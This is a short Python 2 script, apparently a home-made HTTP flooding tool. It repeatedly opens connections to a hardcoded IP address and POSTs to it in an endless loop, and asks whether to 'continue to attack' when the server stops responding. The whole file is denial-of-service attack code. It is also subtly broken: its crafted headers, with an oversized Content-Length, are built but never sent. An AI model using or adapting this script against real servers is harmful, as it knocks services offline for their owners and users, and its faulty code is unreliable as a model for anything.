#!/usr/bin/env python
#coder:Qiaoy<traceurq@gmail.com>
#date:2013.04.13
#banner:v2

import httplib
import time

hosts = '10.121.21.23'	#Ip adder
port = '80'		#web port


while 1:
	try:
		value ="Connection: keep-alive\r\n"+\
			"Keep-Alive: 9999\r\n"+"Content-Length: 99999999999\r\n"+\
			"Content_Type: application/x-www-form-urlencoded\r\n"+\
			"Accept: *.*\r\n"
		conn = httplib.HTTPConnection('%s:%s'%(hosts,port))
		conn.request('POST','/','value')
	except:
		again = raw_input('server is over,Continue to attack?[y/n]\r\n')
		if again == 'y':
			pass
		elif again == 'n':
			exit(1)
